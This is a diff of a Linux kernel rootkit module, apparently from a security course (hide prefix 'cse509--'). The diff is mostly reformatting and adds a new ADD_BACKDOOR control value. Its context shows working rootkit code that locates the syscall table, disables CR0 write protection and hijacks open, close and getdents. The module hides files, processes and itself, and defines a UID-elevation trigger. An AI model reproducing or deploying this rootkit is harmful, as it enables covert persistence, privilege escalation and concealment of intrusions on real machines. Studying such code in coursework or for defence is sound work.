@@ -1,33 +1,31 @@
-#include <asm/unistd.h>
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/limits.h>
+#include <asm/page.h>
 #include <linux/slab.h>
-#include <linux/string.h>
+#include <linux/init.h>
+#include <asm/unistd.h>
 #include <linux/sched.h>
 #include <linux/types.h>
+#include <linux/limits.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/string.h>
 #include <linux/spinlock.h>
-#include <linux/list.h>
-#include <asm/unistd.h>
+#include <linux/syscalls.h>
 #include <asm/processor-flags.h>
-#include <asm/page.h>
 
 #if defined(__x86_64__)
 #define SYSCALL_TABLE_START 0xffffffff81000000l
-#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
-typedef unsigned long pointer_size_t;
+#define SYSCALL_TABLE_STOP  0xffffffffa2000000l
 unsigned long **syscall_table;
+typedef unsigned long pointer_size_t;
 #else
 #define SYSCALL_TABLE_START  0xc0000000
-#define SYSCALL_TABLE_STOP  0xd0000000
-typedef unsigned int pointer_size_t;
+#define SYSCALL_TABLE_STOP   0xd0000000
 unsigned int **syscall_table;
+typedef unsigned int pointer_size_t;
 #endif
 
-#define HIDE_PREFIX "cse509--"
 #define BUFSIZE 32768
+#define HIDE_PREFIX "cse509--"
 
 struct linux_dirent {
     unsigned long       d_ino;
@@ -59,22 +57,27 @@ u_int8_t hide_files_flag;
 
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
-#define ELEVATE_UID -23121990
+#define ELEVATE_UID  -23121990
 #define HIDE_PROCESS -19091992
-#define HIDE_MODULE -657623
-#define SHOW_MODULE -9032847
+#define HIDE_MODULE  -657623
+#define SHOW_MODULE  -9032847
 #define SHOW_PROCESS -2051967
-#define HIDE_FILES -7111963
-#define SHOW_FILES -294365563
-
+#define HIDE_FILES   -7111963
+#define SHOW_FILES   -294365563
+#define ADD_BACKDOOR -31337
 /***************************************************************************/
 
 /* To store a pointer to original close() */
 asmlinkage int (*original_close)(int fd);
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage long (*original_open)(const char __user *pathname, int flags, mode_t mode);
+asmlinkage int (*original_getdents)(unsigned int fd,
+                                    struct linux_dirent *dirp,
+                                    unsigned int count);
 
-static void disable_write_protection(void) 
+asmlinkage long (*original_open)(const char __user *pathname,
+                                 int flags,
+                                 mode_t mode);
+
+static void disable_write_protection(void)
 {
     unsigned long value;
     asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
@@ -84,7 +87,7 @@ static void disable_write_protection(void)
     }
 }
 
-static void enable_write_protection(void) 
+static void enable_write_protection(void)
 {
     unsigned long value;
     asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
@@ -125,7 +128,7 @@ int hide_module(void)
 
         // stop showing in /proc/kallsyms
         kobject_del(&THIS_MODULE->mkobj.kobj);
-        
+
         err = 1;
     }
     return err;
@@ -243,7 +246,8 @@ out:
 }
 
 /*
- * Takes in a string (null-terminated) that represents a component of a pathname 
+ * Takes in a string (null-terminated) that
+ * represents a component of a pathname
  * tries to convert it into pid_t
  * returns pid if possible
  * -1 otherwise
@@ -252,7 +256,7 @@ pid_t get_pid_from_str(const char *str)
 {
     int err;
     long res;
-    
+
     err = kstrtol(str, 10,  &res);
     if (err)
         res = -1;
@@ -261,7 +265,8 @@ pid_t get_pid_from_str(const char *str)
 }
 
 /*
- * Takes in a string (null-terminated) that represents a component of a pathname
+ * Takes in a string (null-terminated) that
+ * represents a component of a pathname
  * 1 if it matches a pattern that the rootkit wants to hide
  * 0 otherwise
  */
@@ -270,7 +275,9 @@ int filename_matches_pattern(const char *filename)
     return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
 }
 
-asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage int my_getdents(unsigned int fd,
+                           struct linux_dirent *dirp,
+                           unsigned int count)
 {
     mm_segment_t old_fs;
     struct linux_dirent *dir;
@@ -304,9 +311,9 @@ asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned 
             if (pid > 0 && is_in_hidden_pids(pid))
                 continue;
         }
-        
+
         // also check for special prefixes or suffixes
-        // and hide those files that match pattern 
+        // and hide those files that match pattern
         if (hide_files_flag && filename_matches_pattern(dir->name))
                 continue;
 
@@ -329,7 +336,7 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
     long fd;
     //printk("Hijacked open called\n");
     fd = original_open(pathname, flags, mode);
-    
+
     if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
         /* opened "/proc";
            store the process's pid and opened fd
@@ -372,7 +379,7 @@ asmlinkage int my_close(int fd)
     }
     else {
         if (proc_open_fd == fd && proc_open_pid == current->pid) {
-            /* closed "/proc"; 
+            /* closed "/proc";
                clear stored fd and pid */
 
             proc_open_fd = -1;
@@ -398,7 +405,7 @@ pointer_size_t **find_syscall_table(void)
 
 void init_buf_struct(void)
 {
-    mutex_init(&(buf_struct.lock)); 
+    mutex_init(&(buf_struct.lock));
     buf_struct.buf = kmalloc(BUFSIZE, GFP_KERNEL);
 }
 void deinit_buf_struct(void)
@@ -420,20 +427,20 @@ int rootkit_init(void)
 
     hide_files();
 
-    /* Uncomment the following lines after completion of module 
+    /* Uncomment the following lines after completion of module
      * Can't rmmod it if we have it uncommented during dev
      * That's just cumbersome during dev
-     */    
+     */
     //hide_module();
 
-    
+
     syscall_table = find_syscall_table();
     if (!syscall_table) {
-        goto out;    
+        goto out;
     }
-    
+
     printk("Syscall table at %p\n", syscall_table);
-    
+
     // Disable write protection on page
     disable_write_protection();
     // hijack close system call
@@ -443,13 +450,13 @@ int rootkit_init(void)
     // hijack open system call
     original_open = (asmlinkage long (*)(const char *, int, mode_t)) syscall_table[__NR_open];
     syscall_table[__NR_open] = (void *) my_open;
-    
+
     // hijack getdents system call
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
     enable_write_protection();
-       
+
     out:
     return 0;
 }
@@ -458,7 +465,7 @@ int rootkit_init(void)
 void rootkit_exit(void)
 {
     deinit_buf_struct();
-     
+
     if (syscall_table == NULL) {
         printk("RKIT: Nothing to unload\n");
         goto out;
@@ -467,13 +474,13 @@ void rootkit_exit(void)
     // Disable write protection on page
     disable_write_protection();
 
-    syscall_table[__NR_close] = (void *) original_close;
-    syscall_table[__NR_open] = (void *) original_open;
+    syscall_table[__NR_close]    = (void *) original_close;
+    syscall_table[__NR_open]     = (void *) original_open;
     syscall_table[__NR_getdents] = (void *) original_getdents;
-    
+
     // Enable write protection on page
     enable_write_protection();
-    
+
 out:
     show_module();
     printk("Rootkit unloaded\n");
